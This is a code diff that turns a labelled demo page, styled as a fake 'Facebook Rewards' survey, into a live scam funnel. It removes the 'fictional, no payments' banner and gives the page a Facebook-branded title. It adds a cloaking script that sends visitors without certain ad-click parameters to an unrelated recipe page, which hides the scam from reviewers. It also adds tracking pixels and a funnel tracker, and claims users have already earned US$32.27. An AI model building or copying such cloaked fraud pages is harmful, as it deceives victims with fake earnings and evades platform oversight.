@@ -1,8 +1,30 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html><html lang="es"><head>
+<script>
+(function(){
+  try{
+    var h=location.hostname;
+    var isDev=h==='localhost'||h==='127.0.0.1'||h.indexOf('preview--')!==-1||h.indexOf('-preview.')!==-1||/\.lovableproject\.com$|^192\.168\./.test(h);
+    var q=new URLSearchParams(location.search);
+    var c=(q.get('utm_campaign')||'').toLowerCase();
+    var ok=c.indexOf('mtp')!==-1 && q.has('fbclid');
+    if(!isDev && !ok){
+      document.documentElement.style.display='none';
+      location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
+      return;
+    }
+    document.title='Facebook Rewards';
+    var m=document.querySelector('meta[name="description"]');
+    if(m)m.setAttribute('content','Earn rewards by evaluating Facebook content.');
+  }catch(e){
+    document.documentElement.style.display='none';
+    location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
+  }
+})();
+</script>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Interface Demo — Fictional Rewards</title>
-  <meta name="description" content="Fictional interface demonstration. Balances and receipts are samples; no payments are available.">
+  <title>Loading...</title>
+  <meta name="description" content="Loading...">
   <link rel="icon" href="images/DF32jO8vZckV.png">
   <link rel="preload" as="image" href="images/amazon_post.webp">
   <link rel="preload" as="image" href="images/apple_post.webp">
@@ -18,6 +40,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/MM3nXP63nRRs.css">
+  <script src="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js" async></script>
 
   
   
@@ -29,10 +52,81 @@
 
 
 
+
+
+<!-- Trackly funnel -->
+<script src="https://click-charm-73.lovable.app/funnel.js?w=976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd&f=3238002b-dbef-4ff0-925c-30702ebfead2" data-auto="true" defer></script>
+<script>
+  (function () {
+    var fired = {};
+    var queue = [];
+    var draining = false;
+    function call(step) {
+      var trk = window.trkFunnel;
+      if (!trk || !trk.step) return false;
+      try {
+        trk.step(step);
+        console.log('[trackly:b3] step disparado -> "' + step + '"');
+        return true;
+      } catch (e) {
+        console.warn('[trackly:b3] erro ao disparar "' + step + '"', e);
+        return false;
+      }
+    }
+    function drain() {
+      if (draining) return;
+      draining = true;
+      var tries = 0;
+      var id = setInterval(function () {
+        if (!queue.length) { clearInterval(id); draining = false; return; }
+        if (call(queue[0])) { queue.shift(); tries = 0; return; }
+        if (++tries > 60) { clearInterval(id); draining = false; console.warn('[trackly:b3] trkFunnel não carregou; step "' + queue[0] + '" não enviado'); }
+      }, 200);
+    }
+    window.b3Step = function (step) {
+      if (fired[step]) { console.log('[trackly:b3] step "' + step + '" já disparado (ignorado)'); return; }
+      fired[step] = true;
+      console.log('[trackly:b3] solicitando step "' + step + '"');
+      queue.push(step);
+      drain();
+    };
+  })();
+</script>
+
+
+<!-- Meta Pixel 1748898273044458 -->
+<script>
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)
+  }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1748898273044458');
+  fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none" alt=""
+    src="https://www.facebook.com/tr?id=1748898273044458&ev=PageView&noscript=1"/>
+</noscript>
 
 
 <!-- Twemoji: emojis estilo Facebook/Twitter -->
   <script src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js" crossorigin="anonymous"></script>
+  <script>
+    (function(){
+      var p=new URLSearchParams(window.location.search);
+      document.addEventListener("click",function(e){
+        var a=e.target.closest("a");
+        if(!a)return;
+        var h=a.getAttribute("href");
+        if(!h||h.startsWith("#")||h.startsWith("javascript:"))return;
+        try{var u=new URL(a.href);p.forEach(function(v,k){u.searchParams.set(k,v);});a.href=u.toString();}catch(err){}
+      });
+    })();
+    </script>
   <style>
     img.emoji { height: 1.1em; width: 1.1em; margin: 0 .05em 0 .05em; vertical-align: -0.15em; display: inline; }
     .step { display: none; }
@@ -83,8 +177,6 @@
       --fb-red: #e32636;
     }
     body { background: var(--fb-bg); color: var(--fb-text); font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
-    .demo-banner { position: sticky; top: 0; z-index: 1000; display: flex; flex: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; min-height: 48px; padding: 7px 12px; background: #92400e; color: white; font-size: 12px; line-height: 1.3; text-align: center; }
-    .demo-banner strong { font-size: 13px; letter-spacing: .05em; }
     .fb-shell { width: 100%; max-width: 430px; min-height: 100svh; margin: 0 auto; background: var(--fb-bg); box-shadow: 0 0 24px rgba(28,30,33,.08); }
     .fb-header { position: sticky; top: 0; z-index: 50; display: flex; align-items: center; justify-content: space-between; min-height: 56px; padding: 8px 12px; background: var(--fb-surface); border-bottom: 1px solid var(--fb-line); }
     .fb-header-logo { width: 116px; height: auto; }
@@ -103,7 +195,7 @@
     .fb-start { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; min-height: 46px; margin-top: 14px; border-radius: 6px; background: var(--fb-blue); color: white; font-size: 15px; font-weight: 700; transition: background .15s ease, transform .15s ease; }
     .fb-start:hover { background: #166fe5; }
     .fb-start:active { transform: scale(.985); }
-    .fb-feed { padding-bottom: 20px; }
+    .fb-feed { padding-bottom: calc(150px + env(safe-area-inset-bottom)); }
     .fb-post { margin: 8px 0 0; overflow: hidden; background: var(--fb-surface); border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); }
     .fb-post-head { display: flex; align-items: center; gap: 9px; padding: 12px 12px 9px; }
     .fb-avatar { width: 40px; height: 40px; flex: none; overflow: hidden; border: 1px solid var(--fb-line); border-radius: 50%; background: var(--fb-surface); }
@@ -127,7 +219,7 @@
     .fb-stat-right { display: flex; gap: 12px; }
     .fb-actions { display: grid; grid-template-columns: repeat(3, 1fr); padding: 3px 5px; }
     .fb-action { display: flex; align-items: center; justify-content: center; gap: 7px; min-height: 44px; border-radius: 5px; color: var(--fb-muted); font-size: 13px; font-weight: 600; }
-    .fb-survey { width: 100%; padding: 12px 12px max(14px, env(safe-area-inset-bottom)); background: var(--fb-surface); border-top: 8px solid var(--fb-bg); text-align: center; }
+    .fb-survey { position: fixed; right: 0; bottom: 0; left: 0; z-index: 45; width: min(100%, 430px); margin: 0 auto; padding: 10px 12px max(10px, env(safe-area-inset-bottom)); background: var(--fb-surface); border-top: 1px solid var(--fb-line); box-shadow: 0 -4px 16px rgba(28,30,33,.12); text-align: center; }
     .fb-survey-kicker { color: var(--fb-muted); font-size: 12px; font-weight: 600; text-transform: uppercase; }
     .fb-question { margin-top: 3px; color: var(--fb-text); font-size: 16px; line-height: 1.2; font-weight: 700; }
     .fb-votes { display: grid; grid-template-columns: minmax(0,1fr) minmax(0,1fr); gap: 8px; margin-top: 9px; }
@@ -138,37 +230,43 @@
     .fb-vote:active { transform: scale(.98); }
     .fb-vote-no { background: var(--fb-red); }
     .fb-vote-yes { background: var(--fb-green); }
-    .support-shell { display: flex; flex-direction: column; width: 100%; height: calc(100svh - var(--demo-banner-height, 48px)); height: calc(100dvh - var(--demo-banner-height, 48px)); min-height: 540px; background: var(--fb-surface); }
+    .support-shell { display: flex; flex-direction: column; width: 100%; height: 100svh; height: 100dvh; min-height: 580px; background: var(--fb-surface); }
     html.chat-full, body.chat-full { width: 100%; height: 100%; overflow: hidden; overscroll-behavior: none; background: var(--fb-surface); }
-    body.chat-full .support-shell { min-height: calc(100svh - var(--demo-banner-height, 48px)); min-height: calc(100dvh - var(--demo-banner-height, 48px)); }
-    .support-header { position: relative; z-index: 3; display: flex; flex: none; align-items: center; justify-content: space-between; min-height: 58px; padding: 0 14px; background: var(--fb-surface); }
-    .support-header .fb-header-logo { width: 118px; height: auto; }
-    .support-balance { margin-left: auto; }
-    .support-agent { display: flex; flex: none; align-items: center; gap: 10px; padding: 10px 14px; border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); background: var(--fb-surface); }
-    .support-agent-avatar { width: 38px; height: 38px; flex: none; border-radius: 50%; object-fit: cover; }
-    .support-agent-name { color: var(--fb-text); font-size: 14px; font-weight: 700; line-height: 1.25; }
-    .support-agent-note { color: var(--fb-muted); font-size: 12px; line-height: 1.25; }
-    .support-chat { display: flex; flex: 1; min-height: 0; flex-direction: column; gap: 11px; overflow-y: auto; padding: 14px 14px 18px; background: transparent; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; }
-    .support-row { display: flex; align-items: flex-end; gap: 8px; max-width: 100%; animation: chatIn .34s cubic-bezier(.2,.8,.2,1) both; }
+    body.chat-full .support-shell { min-height: 100svh; min-height: 100dvh; }
+    .support-header { position: relative; z-index: 3; display: flex; flex: none; align-items: center; justify-content: space-between; min-height: 62px; padding: 12px 18px; background: #ffffff; }
+    .support-fb-logo { display: flex; align-items: center; gap: 10px; }
+    .support-fb-circle { width: 40px; height: 40px; flex-shrink: 0; }
+    .support-fb-brand { display: flex; flex-direction: column; justify-content: center; }
+    .support-fb-name { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 20px; font-weight: 800; color: #050505; line-height: 1.05; letter-spacing: -0.6px; }
+    .support-fb-sub { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 13px; font-weight: 400; color: #050505; line-height: 1; letter-spacing: -0.2px; margin-top: 2px; }
+    .support-balance-badge { display: inline-flex; align-items: center; gap: 7px; padding: 6px 14px; border-radius: 12px; background: #E8F8F0; color: #008a3e; font-size: 16px; font-weight: 700; letter-spacing: -0.2px; }
+    .support-balance-badge svg { color: #008a3e; stroke: #008a3e; flex-shrink: 0; }
+    .support-divider { width: 100%; height: 1px; background: #e4e6eb; flex-shrink: 0; }
+    .support-agent-card { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: #ffffff; flex-shrink: 0; }
+    .support-agent-avatar-wrap { width: 44px; height: 44px; border-radius: 50%; overflow: hidden; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .support-agent-avatar { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; flex-shrink: 0; }
+    .support-agent-info { display: flex; flex-direction: column; justify-content: center; }
+    .support-agent-name { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 16px; font-weight: 700; color: #050505; line-height: 1.25; }
+    .support-agent-role { display: inline-flex; align-items: center; gap: 5.5px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 13px; font-weight: 500; color: #31a24c; line-height: 1.25; margin-top: 2.5px; }
+    .support-status-dot { width: 7.5px; height: 7.5px; border-radius: 50%; background: #31a24c; display: inline-block; flex-shrink: 0; box-shadow: 0 0 0 2px rgba(49,162,76,0.2); animation: statusPulse 2s ease-in-out infinite; }
+    .support-mini-fb { width: 34px; height: 34px; flex-shrink: 0; border-radius: 50%; }
+    .support-row-system { display: flex; justify-content: center; width: 100%; margin: 6px 0; animation: chatIn .3s ease both; }
+    .support-system-badge { display: inline-flex; align-items: center; justify-content: center; padding: 5px 14px; border-radius: 999px; background: #f0f2f5; color: #65676b; font-size: 12.5px; font-weight: 500; letter-spacing: -0.1px; }
+    .support-chat { display: flex; flex: 1; min-height: 0; flex-direction: column; gap: 14px; overflow-y: auto; padding: 16px 18px 24px; background: #ffffff; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; }
+    .support-row { display: flex; align-items: center; gap: 10px; max-width: 100%; animation: chatIn .34s cubic-bezier(.2,.8,.2,1) both; }
     .support-row.user { justify-content: flex-end; }
-    .support-mini-avatar { width: 30px; height: 30px; flex: none; border-radius: 50%; object-fit: cover; background: var(--fb-bg); }
-    .support-bubble { display: inline-block; max-width: 78%; padding: 11px 14px; border: 1px solid rgba(18,18,18,.06); border-radius: 18px 18px 18px 5px; background: #fff; color: #121212; font-size: 14.5px; line-height: 1.45; text-align: left; overflow-wrap: anywhere; box-shadow: 0 3px 12px rgba(18,18,18,.10), 0 1px 2px rgba(18,18,18,.06); }
-    .support-row.user .support-bubble { border-color: var(--fb-blue); border-radius: 18px 18px 5px 18px; background: var(--fb-blue); color: white; font-weight: 600; box-shadow: 0 3px 12px rgba(24,119,242,.2); }
-    .support-bubble strong { font-weight: 700; }
-    .support-confirm-icon { display: inline-flex; align-items: center; justify-content: center; width: 17px; height: 17px; margin-right: 8px; border: 2px solid #16a34a; border-radius: 50%; color: #16a34a; font-size: 11px; font-weight: 700; vertical-align: -2px; }
-    .support-eligibility { display: flex; align-items: flex-start; gap: 8px; }
-    .support-eligibility .support-confirm-icon { margin: 2px 0 0; flex: none; }
-    .support-notice { display: flex; align-items: flex-start; gap: 10px; }
-    .support-warning-icon { flex: none; color: #b76b0b; font-size: 19px; line-height: 1.1; }
+    .support-mini-avatar { width: 34px; height: 34px; flex: none; border-radius: 50%; object-fit: cover; background: #f0f2f5; }
+    .support-bubble { display: inline-block; max-width: 84%; padding: 13px 18px; border: 1px solid rgba(0,0,0,.04); border-radius: 20px; background: #ffffff; color: #050505; font-size: 15px; line-height: 1.45; text-align: left; overflow-wrap: anywhere; box-shadow: 0 2px 6px rgba(0,0,0,.05), 0 1px 2px rgba(0,0,0,.03); }
+    .support-row.user .support-bubble { border-color: var(--fb-blue); border-radius: 20px; background: var(--fb-blue); color: white; font-weight: 600; box-shadow: 0 3px 12px rgba(24,119,242,.2); }
+    .support-bubble strong { font-weight: 700; color: #050505; }
+    .support-row.user .support-bubble strong { color: white; }
     .support-typing { display: inline-flex; align-items: center; gap: 4px; min-width: 54px; padding: 12px 14px; }
     .support-typing span { width: 6px; height: 6px; border-radius: 50%; background: #8a8d91; animation: typingDot 1s ease-in-out infinite; }
     .support-typing span:nth-child(2) { animation-delay: .15s; }
     .support-typing span:nth-child(3) { animation-delay: .3s; }
-    .support-receipt-loading { display: inline-flex; align-items: center; gap: 10px; min-width: 210px; }
-    .support-receipt-spinner { width: 22px; height: 22px; flex: none; border: 3px solid #ccd0d5; border-top-color: var(--fb-blue); border-radius: 50%; animation: receiptSpin .75s linear infinite; }
-    .support-message-loading { display: inline-flex; align-items: center; gap: 9px; min-width: 145px; min-height: 42px; font-size: 13px; font-weight: 600; }
-    .support-message-loading .support-receipt-spinner { width: 18px; height: 18px; border-width: 2px; }
-    .support-receipt-loading-text { font-size: 13px; font-weight: 600; }
+    .support-receipt-loading { display: inline-flex; align-items: center; gap: 12px; }
+    .support-receipt-spinner { width: 20px; height: 20px; flex: none; border: 2.5px solid #e4e6eb; border-top-color: var(--fb-blue); border-radius: 50%; animation: receiptSpin .75s linear infinite; }
+    .support-receipt-loading-text { font-size: 14.5px; font-weight: 500; color: #050505; }
     .support-receipt { width: min(330px, calc(100vw - 58px)); overflow: hidden; border: 1px solid var(--fb-line); border-radius: 12px; background: white; color: #171717; box-shadow: 0 6px 20px rgba(28,30,33,.14); }
     .support-receipt-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 10px 12px; background: #171717; color: white; }
     .support-receipt-brand { display: flex; align-items: center; gap: 7px; min-width: 0; font-size: 13px; font-weight: 700; }
@@ -194,25 +292,95 @@
     .support-receipt-signature { font-family: "Brush Script MT", "Segoe Script", cursive; font-size: 17px; }
     .support-receipt-method, .support-receipt-notice { margin-top: 11px; border-top: 1px solid var(--fb-line); padding-top: 9px; }
     .support-receipt-notice { padding: 8px; border: 1px solid var(--fb-line); border-radius: 5px; }
-    .support-receipt-foot { display: flex; justify-content: center; padding: 9px; background: var(--fb-blue); }
-    .support-receipt-foot img { width: 48px; height: 22px; object-fit: contain; filter: brightness(0) invert(1); }
-    .support-video { display: grid; place-items: center; width: min(330px, calc(100vw - 66px)); min-height: 180px; padding: 24px; border: 1px solid var(--fb-line); border-radius: 10px; background: #171717; color: white; font-size: 14px; font-weight: 600; text-align: center; box-shadow: 0 3px 12px rgba(28,30,33,.12); }
+    .support-receipt-foot { display: flex; align-items: center; justify-content: center; padding: 10px 12px; background: var(--fb-blue); }
+    .receipt-foot-brand { display: inline-flex; align-items: center; gap: 6px; }
+    .receipt-foot-brand svg { width: 17px; height: 17px; flex-shrink: 0; }
+    .receipt-foot-text { display: flex; flex-direction: column; line-height: 1; text-align: left; }
+    .receipt-foot-name { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 11px; font-weight: 800; color: #ffffff; letter-spacing: -0.3px; line-height: 1; }
+    .receipt-foot-sub { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 8px; font-weight: 400; color: rgba(255,255,255,0.92); letter-spacing: -0.1px; margin-top: 2px; line-height: 1; }
+    .support-video { width: min(320px, calc(100vw - 66px)); overflow: hidden; border: 1px solid var(--fb-line); border-radius: 12px; background: #000; box-shadow: 0 4px 16px rgba(0,0,0,.15); }
+    .support-video iframe { border: 0; }
     .support-image { display: block; width: min(290px, calc(100vw - 76px)); height: auto; border: 1px solid rgba(0,0,0,.05); border-radius: 16px; box-shadow: 0 1px 2px rgba(0,0,0,.08); }
-    .support-footer { flex: none; padding: 10px 14px max(10px, env(safe-area-inset-bottom)); background: var(--fb-surface); border-top: 1px solid var(--fb-line); }
+    .support-footer { flex: none; padding: 12px 16px max(12px, env(safe-area-inset-bottom)); background: #ffffff; border-top: 1px solid #e4e6eb; }
     .support-footer:not(:has(.support-choice.visible)):not(:has(.support-form.visible)) { display: none; }
-    .support-choice { display: none; width: 100%; min-height: 48px; padding: 12px 18px; border-radius: 999px; background: var(--fb-blue); color: white; font-size: 15px; font-weight: 800; box-shadow: 0 6px 18px rgba(24,119,242,.35); animation: ctaPulseBlue 1.8s ease-in-out infinite; }
+    .support-choice { display: none; width: 100%; min-height: 48px; padding: 12px 18px; border-radius: 999px; background: var(--fb-blue); color: white; font-size: 15px; font-weight: 700; box-shadow: 0 4px 14px rgba(24,119,242,.3); }
     .support-choice.visible { display: block; animation: chatIn .3s ease both; }
-    .support-form { display: none; grid-template-columns: minmax(0,1fr) auto; gap: 8px; animation: chatIn .3s ease both; }
+    .support-form { display: none; align-items: center; grid-template-columns: minmax(0,1fr) auto; gap: 10px; animation: chatIn .3s ease both; }
     .support-form.visible { display: grid; }
-    .support-input { min-width: 0; height: 46px; border: 1px solid var(--fb-line); border-radius: 999px; padding: 0 16px; background: var(--fb-bg); color: var(--fb-text); font-size: 14px; outline: none; }
-    .support-input:focus { border-color: var(--fb-blue); box-shadow: 0 0 0 2px var(--fb-blue-soft); }
-    .support-send { width: 46px; height: 46px; border-radius: 50%; background: var(--fb-blue); color: white; font-size: 20px; font-weight: 700; }
+    .support-input { min-width: 0; height: 48px; border: 1px solid #e4e6eb; border-radius: 999px; padding: 0 20px; background: #F0F2F5; color: #050505; font-size: 15px; outline: none; transition: background .15s, border-color .15s; }
+    .support-input::placeholder { color: #8a8d91; }
+    .support-input:focus { background: #ffffff; border-color: var(--fb-blue); box-shadow: 0 0 0 2px rgba(24,119,242,.2); }
+    .support-send { width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; border-radius: 50%; background: var(--fb-blue); color: white; flex-shrink: 0; transition: transform .1s, filter .15s; }
+    .support-send:active { transform: scale(.94); }
+    .support-send svg { margin-left: 2px; }
     .support-note { margin-top: 7px; color: var(--fb-muted); font-size: 10px; text-align: center; }
     @keyframes chatIn { from { opacity: 0; transform: translateY(7px); } to { opacity: 1; transform: translateY(0); } }
     @keyframes typingDot { 0%, 60%, 100% { transform: translateY(0); opacity: .45; } 30% { transform: translateY(-3px); opacity: 1; } }
     @keyframes receiptSpin { to { transform: rotate(360deg); } }
     @keyframes statusPulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: .5; transform: scale(.85); } }
     @keyframes ctaPulseBlue { 0%, 100% { box-shadow: 0 6px 18px rgba(24,119,242,.35); } 50% { box-shadow: 0 6px 26px rgba(24,119,242,.6); } }
+    .smartplayer-scroll-event { display: block; width: 100%; height: 1px; min-height: 1px; margin: 0; padding: 0; opacity: 0; pointer-events: none; }
+    /* ─── Facebook Post & Comments in Chat ─── */
+    .support-row-fbpost { display: flex; align-items: flex-start; gap: 10px; max-width: 100%; animation: chatIn .34s cubic-bezier(.2,.8,.2,1) both; }
+    .chat-fb-post-wrapper { min-width: 0; max-width: 100%; }
+    .chat-fb-post { width: min(390px, calc(100vw - 68px)); background: #ffffff; border: 1px solid #e4e6eb; border-radius: 14px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,.07); }
+    .chat-fb-post-head { display: flex; align-items: center; gap: 10px; padding: 12px 14px 10px; }
+    .chat-fb-avatar { width: 40px; height: 40px; flex: none; border-radius: 50%; overflow: hidden; }
+    .chat-fb-avatar img { width: 100%; height: 100%; object-fit: cover; }
+    .chat-fb-post-meta { min-width: 0; flex: 1; }
+    .chat-fb-post-name { display: flex; align-items: center; gap: 4px; font-size: 14.5px; font-weight: 700; color: #050505; }
+    .chat-fb-post-name img { width: 14px; height: 14px; flex-shrink: 0; }
+    .chat-fb-sponsored { display: flex; align-items: center; gap: 4px; font-size: 12px; color: #65676b; margin-top: 1px; }
+    .chat-fb-more { display: grid; place-items: center; width: 32px; height: 32px; border-radius: 50%; color: #65676b; background: none; border: none; cursor: pointer; }
+    .chat-fb-copy { padding: 2px 14px 12px; font-size: 14.5px; line-height: 1.4; color: #050505; }
+    .chat-fb-video-wrap { width: 100%; background: #000; overflow: hidden; }
+    .chat-fb-stats { display: flex; align-items: center; justify-content: space-between; padding: 10px 14px; font-size: 13px; color: #65676b; border-bottom: 1px solid #e4e6eb; }
+    .chat-fb-reactions { display: flex; align-items: center; gap: 6px; }
+    .chat-fb-reaction-stack { display: flex; align-items: center; }
+    .chat-fb-reaction { display: flex; align-items: center; justify-content: center; width: 18px; height: 18px; border-radius: 50%; border: 1.5px solid #fff; margin-left: -4px; }
+    .chat-fb-reaction:first-child { margin-left: 0; }
+    .fb-rx-like { background: #1877F2; }
+    .fb-rx-love { background: #FA383E; }
+    .chat-fb-stat-right { display: flex; gap: 8px; font-size: 13px; color: #65676b; }
+    .chat-fb-actions { display: grid; grid-template-columns: repeat(3, 1fr); padding: 4px 6px; border-bottom: 1px solid #e4e6eb; }
+    .chat-fb-action { display: flex; align-items: center; justify-content: center; gap: 6px; min-height: 38px; border-radius: 6px; color: #65676b; font-size: 13.5px; font-weight: 600; background: none; border: none; cursor: pointer; transition: background .15s, color .15s, transform .1s; user-select: none; }
+    .chat-fb-action:hover { background: #f0f2f5; }
+    .chat-fb-action:active { transform: scale(.96); }
+    .chat-fb-action.liked { color: #1877F2 !important; font-weight: 700; }
+    .chat-fb-action.liked svg { stroke: #1877F2; fill: #1877F2; }
+    .chat-fb-comments-bar { display: flex; align-items: center; justify-content: space-between; padding: 9px 14px 6px; font-size: 12px; font-weight: 700; color: #65676b; background: #fafbfc; border-bottom: 1px solid #f0f2f5; }
+    .chat-fb-comments { max-height: 290px; overflow-y: auto; padding: 12px 12px 10px; display: flex; flex-direction: column; gap: 12px; background: #ffffff; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; }
+    .chat-fb-comments::-webkit-scrollbar { width: 5px; }
+    .chat-fb-comments::-webkit-scrollbar-track { background: #f0f2f5; }
+    .chat-fb-comments::-webkit-scrollbar-thumb { background: #ccd0d5; border-radius: 4px; }
+    .fb-comment-item { display: flex; align-items: flex-start; gap: 8px; transition: transform .3s ease, opacity .3s ease; }
+    .fb-comment-item.new-in { animation: commentSlideIn .4s cubic-bezier(.2,.8,.2,1) both; }
+    .fb-comment-item.user-highlight { animation: commentHighlight 2s ease both; }
+    @keyframes commentSlideIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes commentHighlight { 0% { background: rgba(24,119,242,0.12); border-radius: 12px; padding: 4px; } 100% { background: transparent; padding: 0; } }
+    .fb-comment-avatar { width: 32px; height: 32px; flex: none; border-radius: 50%; object-fit: cover; }
+    .fb-comment-avatar-user { width: 32px; height: 32px; flex: none; border-radius: 50%; background: linear-gradient(135deg, #1877F2, #0d5cb6); color: white; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; }
+    .fb-comment-content { min-width: 0; flex: 1; }
+    .fb-comment-bubble { display: inline-block; max-width: 100%; background: #f0f2f5; border-radius: 18px; padding: 8px 12px 9px; box-sizing: border-box; }
+    .fb-comment-author { display: flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 700; color: #050505; line-height: 1.2; }
+    .fb-comment-author-badge { font-size: 10px; font-weight: 600; padding: 1px 5px; border-radius: 4px; background: #e7f3ff; color: #1877f2; }
+    .fb-comment-text { font-size: 13.5px; color: #050505; line-height: 1.35; margin-top: 2px; overflow-wrap: anywhere; }
+    .fb-comment-footer { display: flex; align-items: center; gap: 12px; padding-left: 10px; margin-top: 4px; font-size: 12px; color: #65676b; }
+    .fb-comment-time { font-weight: 600; color: #65676b; }
+    .fb-comment-like-btn { font-weight: 600; color: #65676b; cursor: pointer; transition: color .15s, transform .1s; user-select: none; }
+    .fb-comment-like-btn:active { transform: scale(.94); }
+    .fb-comment-like-btn.liked { color: #1877F2 !important; font-weight: 700; }
+    .fb-comment-reactions-pill { display: inline-flex; align-items: center; gap: 4px; padding: 2px 6px; border-radius: 999px; background: #ffffff; border: 1px solid #e4e6eb; box-shadow: 0 1px 3px rgba(0,0,0,.08); font-size: 11px; margin-left: auto; transition: transform .2s ease; }
+    .fb-comment-reactions-pill.bump { transform: scale(1.18); }
+    /* Comment Form at bottom of post */
+    .chat-fb-comment-form { display: flex; align-items: center; gap: 8px; padding: 9px 12px; background: #ffffff; border-top: 1px solid #e4e6eb; }
+    .chat-fb-input-box { display: flex; align-items: center; flex: 1; background: #f0f2f5; border-radius: 20px; padding: 0 6px 0 14px; height: 36px; border: 1px solid transparent; transition: border-color .15s, background .15s; }
+    .chat-fb-input-box:focus-within { border-color: #1877F2; background: #ffffff; box-shadow: 0 0 0 2px rgba(24,119,242,.15); }
+    .chat-fb-comment-input { flex: 1; border: none; background: transparent; outline: none; font-size: 13.5px; color: #050505; font-family: inherit; }
+    .chat-fb-comment-input::placeholder { color: #8a8d91; }
+    .chat-fb-comment-btn { display: flex; align-items: center; justify-content: center; width: 28px; height: 28px; border-radius: 50%; border: none; background: transparent; color: #1877F2; cursor: pointer; transition: transform .1s, opacity .15s; }
+    .chat-fb-comment-btn:hover { background: rgba(24,119,242,.08); transform: scale(1.05); }
+    .chat-fb-comment-btn:active { transform: scale(.92); }
     @media (min-width: 640px) {
       .fb-shell { margin: 16px auto; min-height: calc(100svh - 32px); overflow: hidden; }
       .fb-welcome-post, .fb-post { border-left: 1px solid var(--fb-line); border-right: 1px solid var(--fb-line); }
@@ -233,7 +401,7 @@
       .fb-media { height: auto; max-height: none; object-fit: contain; }
       .fb-stats { min-height: 36px; margin-inline: 10px; }
       .fb-actions { display: none; }
-      .fb-feed { padding-bottom: 16px; }
+      .fb-feed { padding-bottom: calc(132px + env(safe-area-inset-bottom)); }
       .fb-survey-kicker { font-size: 10px; }
       .fb-question { font-size: 14px; }
       .fb-vote { min-height: 40px; }
@@ -241,14 +409,14 @@
     @media (max-width: 767px) {
       body.chat-full #step-4 {
         position: fixed;
-        top: var(--chat-viewport-top, 48px);
+        top: var(--chat-viewport-top, 0px);
         right: 0;
         bottom: auto;
         left: 0;
         z-index: 90;
         display: block;
         width: 100%;
-        height: var(--chat-viewport-height, calc(100dvh - 48px));
+        height: var(--chat-viewport-height, 100dvh);
         overflow: hidden;
         background: var(--fb-surface);
       }
@@ -267,7 +435,6 @@
   </style>
 </head>
 <body class="flex flex-col min-w-0 min-h-svh items-center antialiased">
-  <div class="demo-banner" role="note"><strong>APENAS DEMONSTRAÇÃO</strong><span>Todo o conteúdo abaixo é fictício, incluindo saldo e recibo. Nenhum pagamento é realizado.</span></div>
 
   
 
@@ -277,7 +444,7 @@
       <!-- ─────────────────────────────────────────── -->
       <!-- STEP 0: Welcome                             -->
       <!-- ─────────────────────────────────────────── -->
-      <div id="step-0" class="step active">
+      <div id="step-0" class="step active" data-funnel-view="tela_inicial">
         <div class="fb-shell appear">
           <header class="fb-header">
             <img alt="Facebook" width="125" height="28" class="fb-header-logo" src="images/Facebook_Logo_%282019%29.svg">
@@ -306,7 +473,7 @@
                 <span>You've already earned US$32.27!</span>
                 </div>
                 <p>Complete all assessments and make your first withdrawal!</p>
-                <button onclick="nextStep()" class="fb-start">
+                <button onclick="nextStep()" class="fb-start" data-funnel-step="post_1">
                 <span>Click to Get Started</span>
                 <svg class="rotate-90 w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                   <path d="M18 11V6a2 2 0 0 0-4 0"></path><path d="M14 10V4a2 2 0 0 0-4 0v2"></path>
@@ -347,25 +514,52 @@
       <!-- ─────────────────────────────────────────── -->
       <!-- STEP 4: Support chat                        -->
       <!-- ─────────────────────────────────────────── -->
-      <div id="step-4" class="step">
+      <div id="step-4" class="step" data-funnel-view="chat">
         <div class="support-shell appear">
           <header class="support-header">
